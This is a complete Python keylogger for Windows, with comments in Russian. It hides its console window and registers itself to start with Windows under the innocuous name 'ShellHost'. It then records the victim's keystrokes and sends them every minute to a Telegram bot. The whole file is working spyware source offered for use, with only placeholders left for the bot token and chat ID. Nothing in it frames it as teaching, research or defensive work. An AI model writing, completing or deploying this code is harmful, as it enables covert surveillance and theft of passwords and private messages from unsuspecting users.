import keyboard
import threading
import requests
import ctypes
import os
import sys
import winreg

# === Telegram настройки ===
BOT_TOKEN = 'ВАШ_ТОКЕН'
CHAT_ID = 'ВАШ_CHAT_ID'
SEND_INTERVAL = 60  # интервал в секундах

log_data = ""

# === Скрытие окна консоли ===
def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

# === Автозагрузка ===
def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "ShellHost", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    except:
        pass

# === Отправка данных в Telegram ===
def send_log():
    global log_data
    if log_data:
        try:
            MAX_LEN = 4000
            chunks = [log_data[i:i + MAX_LEN] for i in range(0, len(log_data), MAX_LEN)]
            for chunk in chunks:
                requests.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                    data={'chat_id': CHAT_ID, 'text': chunk}
                )
            log_data = ""
        except:
            pass
    threading.Timer(SEND_INTERVAL, send_log).start()

# === Обработка клавиш ===
def on_key(event):
    global log_data
    try:
        name = event.name
        if name == 'space':
            log_data += ' '
        elif name == 'enter':
            log_data += '\n'
        elif name == 'backspace':
            log_data = log_data[:-1]
        elif len(name) == 1 and name.isprintable():
            log_data += name
        # никакие alt/shift не логируются
    except:
        pass

# === Точка входа ===
if __name__ == "__main__":
    hide_console()
    add_to_startup()
    send_log()
    keyboard.on_press(on_key)

    keyboard.wait()
